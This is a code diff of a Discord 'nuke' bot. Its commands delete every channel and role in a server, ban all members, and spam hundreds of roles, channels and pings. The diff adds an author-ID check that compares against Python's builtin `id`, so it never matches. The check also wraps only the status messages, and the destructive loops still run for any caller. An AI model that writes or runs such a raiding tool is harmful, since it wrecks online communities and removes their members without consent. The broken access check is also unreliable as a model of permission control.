@@ -68,17 +68,20 @@ async def help(ctx:commands.Context):
     embed.add_field(name="SpamPing",value="\nSpams Ping.",inline=False)
     
     embed.set_thumbnail(url=Jumbopic)
-    if silent is False:
-        await ctx.send(embed=embed)
-    else:
-        print(helplog)
+    if ctx.author.id in [id]:
+        if silent is False:
+            await ctx.send(embed=embed)
+        else:
+            print(helplog)
+    else:pass
 
 @client.command()
 async def ChannelDelete(ctx:commands.Context):
     await ctx.message.delete()
-    
-    if silent is False:await ctx.send("```Deleting Channels```")
-    else:print("[!]Deleting Channels[!]")
+    if ctx.author.id in [id]:
+        if silent is False:await ctx.send("```Deleting Channels```")
+        else:print("[!]Deleting Channels[!]")
+    else: pass
         
     for channel in list(ctx.guild.channels):
         try: await channel.delete()
@@ -87,9 +90,10 @@ async def ChannelDelete(ctx:commands.Context):
 @client.command()
 async def SpamPing(ctx:commands.Context,*,msg:str):
     await ctx.message.delete()
-    
-    if silent is False:await ctx.send("```Spamming Channels```")
-    else:print("[!]Spamming Channels[!]")
+    if ctx.author.id in [id]:
+        if silent is False:await ctx.send("```Spamming Channels```")
+        else:print("[!]Spamming Channels[!]")
+    else:pass
     
     for channel in list(ctx.guild.channels):
         try:
@@ -101,9 +105,10 @@ async def SpamPing(ctx:commands.Context,*,msg:str):
 @client.command()
 async def BanAll(ctx:commands.Context):
     await ctx.message.delete()
-    
-    if silent is False: await ctx.send("```Banning all members```")
-    else:print("[!]Banning all members[!]")
+    if ctx.author.id in [id]:
+        if silent is False: await ctx.send("```Banning all members```")
+        else:print("[!]Banning all members[!]")
+    else:pass
     
     for user in list(ctx.guild.members):
         try: await user.ban()
@@ -112,9 +117,10 @@ async def BanAll(ctx:commands.Context):
 @client.command()
 async def RolesDelete(ctx:commands.Context):
     await ctx.message.delete()
-    
-    if silent is False:await ctx.send("```Deleting all roles```")
-    else: print("[!]Deleting all roles[!]")
+    if ctx.author.id in [id]:
+        if silent is False:await ctx.send("```Deleting all roles```")
+        else: print("[!]Deleting all roles[!]")
+    else:pass
     
     for role in list(ctx.guild.roles):
         try: await role.delete()
@@ -123,18 +129,20 @@ async def RolesDelete(ctx:commands.Context):
 @client.command()
 async def RolesSpam(ctx:commands.Context,*,name:str):
     await ctx.message.delete()
-    
-    if silent is False:await ctx.send("```Spamming Roles```")
-    else:print("[!]Spamming Roles[!]")
+    if ctx.author.id in [id]:
+        if silent is False:await ctx.send("```Spamming Roles```")
+        else:print("[!]Spamming Roles[!]")
+    else:pass
     
     for _ in range(250):await ctx.guild.create_role(name=f"{name}")
 
 @client.command()
 async def ChannelSpam(ctx:commands.Context,*,name:str):
     await ctx.message.delete()
-    
-    if silent  in  "off":await ctx.send("```Spamminf Channels```")
-    else:print("[!]Spamming Channels[!]")
+    if ctx.author.id in [id]:
+        if silent  in  "off":await ctx.send("```Spamminf Channels```")
+        else:print("[!]Spamming Channels[!]")
+    else:pass
     
     for _ in range(250): await ctx.guild.create_text_channel(name=f"{name}")
 
@@ -148,8 +156,10 @@ async def on_command_error(ctx:commands.Context,error):
 
 @client.command()
 async def Nuke(ctx:commands.Context):
-    if silent is False:await ctx.send(f"```Nuking```\n{nukegif}")
-    else:print("[!]Nuking[!]")
+    if ctx.author.id in [id]:
+        if silent is False:await ctx.send(f"```Nuking```\n{nukegif}")
+        else:print("[!]Nuking[!]")
+    else:pass
     
     for user in list(ctx.guild.members):
         try: await user.ban()
